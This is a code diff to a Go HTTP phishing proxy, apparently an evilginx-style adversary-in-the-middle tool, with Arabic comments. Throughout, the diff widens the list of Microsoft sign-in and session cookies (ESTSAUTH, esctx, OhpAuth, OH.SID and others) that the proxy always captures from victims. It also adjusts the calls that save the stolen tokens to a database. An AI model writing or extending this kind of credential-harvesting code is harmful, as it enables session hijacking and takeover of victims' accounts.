@@ -1204,7 +1204,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// التقاط جميع الكوكيز بغض النظر عن الشروط
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						// تحقق مما إذا كان الكوكي من الكوكيز المهمة التي نريد التقاطها دائمًا
-						importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
+						importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT", "SignInStateCookie", "esctx", "esctx-lwT1klJj6xs", "esctx-wBx19e5C0fE", "CCState", "buid", "fpc", "stsservicecookie", "x-ms-gateway-slice", "OhpAuthC1", "OhpAuthC2", "OhpToken", "userid", ".AspNetCore.OpenIdConnect.Nonce.YEfco…MaQbx", "OH.SID", "chunks-2", "OhpAuth", "OhpCode", "UserIndex", ".AspNetCore.Correlation.pBD2cGtgVlT…Pf09F20-O8Q", "AjaxSessionKey", "OH.FLID"}
 						isImportantCookie := false
 						
 						for _, cookieName := range importantCookies {
@@ -1254,7 +1254,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
 								
 								// محاولة الحفظ الفوري للكوكيز المهمة
-								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens, s.BodyTokens, s.HttpTokens); err != nil {
+								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 									log.Error("database: فشل في حفظ الكوكي المهم %s: %v", ck.Name, err)
 								} else {
 									log.Success("[%d] تم حفظ الكوكي المهم في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
@@ -1279,7 +1279,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 								
 								// حفظ الكوكيز العادية في قاعدة البيانات
-								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens, s.BodyTokens, s.HttpTokens); err != nil {
+								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 									log.Error("database: %v", err)
 								} else {
 									log.Success("[%d] تم حفظ الكوكيز في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
@@ -1359,7 +1359,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
-						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens, s.BodyTokens, s.HttpTokens); err != nil {
+						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
 						}
 						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
@@ -1494,7 +1494,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens, s.BodyTokens, s.HttpTokens)
+							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
 							if err != nil {
 								log.Error("database: %v", err)
 							}
